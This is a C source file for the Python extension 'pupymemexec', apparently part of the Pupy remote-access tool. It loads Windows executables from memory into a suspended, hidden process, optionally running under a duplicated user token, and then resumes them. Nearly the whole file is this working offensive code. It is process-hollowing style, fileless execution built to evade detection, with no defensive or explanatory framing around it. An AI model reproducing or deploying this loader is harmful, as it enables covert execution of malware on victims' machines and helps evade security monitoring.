/*
# --------------------------------------------------------------
# Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
# All rights reserved.
#
# Redistribution and use in source and binary forms, with or without modification, are permitted provided that the following conditions are met:
#
# 1. Redistributions of source code must retain the above copyright notice, this list of conditions and the following disclaimer.
#
# 2. Redistributions in binary form must reproduce the above copyright notice, this list of conditions and the following disclaimer in the documentation and/or other materials provided with the distribution.
#
# 3. Neither the name of the copyright holder nor the names of its contributors may be used to endorse or promote products derived from this software without specific prior written permission.
#
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE
# --------------------------------------------------------------
*/

#include <stdio.h>
#include <windows.h>
#include <Python.h>
#include "in-mem-exe.c"
static char module_doc[] = "pupymemexec allows pupy to execute PE executables from memory !";

static PyObject *Py_run_pe_from_memory(PyObject *self, PyObject *args) {
	PROCESS_INFORMATION pi;
	STARTUPINFO si;
	SECURITY_ATTRIBUTES saAttr = {
		sizeof(SECURITY_ATTRIBUTES),
		NULL,
		TRUE
	};

	HANDLE g_hChildStd_IN_Rd = NULL;
	HANDLE g_hChildStd_IN_Wr = NULL;
	HANDLE g_hChildStd_OUT_Rd = NULL;
	HANDLE g_hChildStd_OUT_Wr = NULL;
	BOOL inherit = FALSE;
	PyObject* py_redirect_stdio = Py_False;
	PyObject* py_hidden = Py_True;
	DWORD createFlags = CREATE_SUSPENDED|CREATE_NEW_CONSOLE;
	char *cmd_line;
	char *pe_raw_bytes;
	int pe_raw_bytes_len;

#ifdef _WIN64
	PY_LONG_LONG dupHandleAddressPLL = 0;
	void **dupHandleAddress = NULL;
	HANDLE dupHandle = NULL;

	if (!PyArg_ParseTuple(
			args,
			"ss#|OOK",
			&cmd_line, &pe_raw_bytes, &pe_raw_bytes_len,
			&py_redirect_stdio, &py_hidden, &dupHandleAddressPLL))
		// the address of the handle is directly passed with ctypes
		return NULL;

	dupHandleAddress = (void **) ((DWORD_PTR) dupHandleAddressPLL);
#else
	PVOID dupHandleAddress = NULL;
	HANDLE dupHandle = NULL;

	if (!PyArg_ParseTuple(
			args,
			"ss#|OOI",
			&cmd_line, &pe_raw_bytes, &pe_raw_bytes_len,
			&py_redirect_stdio, &py_hidden, &dupHandleAddress))
		// the address of the handle is directly passed with ctypes
		return NULL;
#endif

	memset(&si,0,sizeof(STARTUPINFO));
	memset(&pi,0,sizeof(PROCESS_INFORMATION));
	si.cb = sizeof(STARTUPINFO);
	if(PyObject_IsTrue(py_hidden)){
		si.dwFlags |= STARTF_USESHOWWINDOW;
		si.wShowWindow = SW_HIDE;
		createFlags |= CREATE_NO_WINDOW;
	}

	if (PyObject_IsTrue(py_redirect_stdio)) {
		if (!CreatePipe(&g_hChildStd_IN_Rd, &g_hChildStd_IN_Wr, &saAttr, 0)) {
			return PyErr_Format(PyExc_Exception, "Error in CreatePipe (IN): Errno %d", GetLastError());
		}

		if (!CreatePipe(&g_hChildStd_OUT_Rd, &g_hChildStd_OUT_Wr, &saAttr, 0)) {
			CloseHandle(g_hChildStd_IN_Rd);
			CloseHandle(g_hChildStd_IN_Wr);
			return PyErr_Format(PyExc_Exception, "Error in CreatePipe (OUT): Errno %d", GetLastError());
		}

		si.hStdInput  = g_hChildStd_IN_Rd;
		si.hStdOutput = g_hChildStd_OUT_Wr;
		si.hStdError  = g_hChildStd_OUT_Wr;
		si.dwFlags   |= STARTF_USESTDHANDLES;
		inherit=TRUE;
	}

	if (!dupHandleAddress) {
		if(!CreateProcess(NULL, cmd_line, &saAttr, NULL, inherit, createFlags, NULL, NULL, &si, &pi)) {
			CloseHandle(g_hChildStd_IN_Rd); CloseHandle(g_hChildStd_IN_Wr);
			CloseHandle(g_hChildStd_OUT_Rd); CloseHandle(g_hChildStd_OUT_Wr);

			return PyErr_Format(PyExc_Exception, "Error in CreateProcess: Errno %d", GetLastError());
		}

	} else {
		dupHandle=(HANDLE) dupHandleAddress;
		if (!CreateProcessAsUser(dupHandle, NULL, cmd_line, &saAttr,
								 NULL, inherit, createFlags, NULL, NULL, &si, &pi)) {
			CloseHandle(g_hChildStd_IN_Rd); CloseHandle(g_hChildStd_IN_Wr);
			CloseHandle(g_hChildStd_OUT_Rd); CloseHandle(g_hChildStd_OUT_Wr);

			return PyErr_Format(
				PyExc_Exception, "Error in CreateProcess: Errno %d dupHandle %x", GetLastError(),
				dupHandle
			);
		}
	}

	CloseHandle(g_hChildStd_IN_Rd);
	CloseHandle(g_hChildStd_OUT_Wr);

	if (!MapNewExecutableRegionInProcess(pi.hProcess, pi.hThread, pe_raw_bytes)) {
		TerminateProcess(pi.hProcess, 1);
		CloseHandle(pi.hProcess);
		CloseHandle(g_hChildStd_IN_Rd); CloseHandle(g_hChildStd_IN_Wr);
		CloseHandle(g_hChildStd_OUT_Rd); CloseHandle(g_hChildStd_OUT_Wr);
		return PyErr_Format(PyExc_Exception, "Error in MapNewExecutableRegionInProcess: Errno %d", GetLastError());
	}

	if (ResumeThread(pi.hThread) == (DWORD)-1) {
		TerminateProcess(pi.hProcess, 1);
		CloseHandle(pi.hProcess);
		CloseHandle(g_hChildStd_IN_Rd); CloseHandle(g_hChildStd_IN_Wr);
		CloseHandle(g_hChildStd_OUT_Rd); CloseHandle(g_hChildStd_OUT_Wr);
		return PyErr_Format(PyExc_Exception, "Error in ResumeThread: Errno %d", GetLastError());
	}

	CloseHandle(pi.hThread);

	return Py_BuildValue("(III)", pi.hProcess, g_hChildStd_IN_Wr, g_hChildStd_OUT_Rd);
}

static PyMethodDef methods[] = {
	{
		"run_pe_from_memory", Py_run_pe_from_memory, METH_VARARGS|METH_KEYWORDS,
		"run_pe_from_memory(cmdline, raw_pe, redirected_stdio=True, hidden=True)"
	},
	{
		NULL, NULL
	},
};

DL_EXPORT(void)
initpupymemexec(void) {
	Py_InitModule3("pupymemexec", methods, module_doc);
}
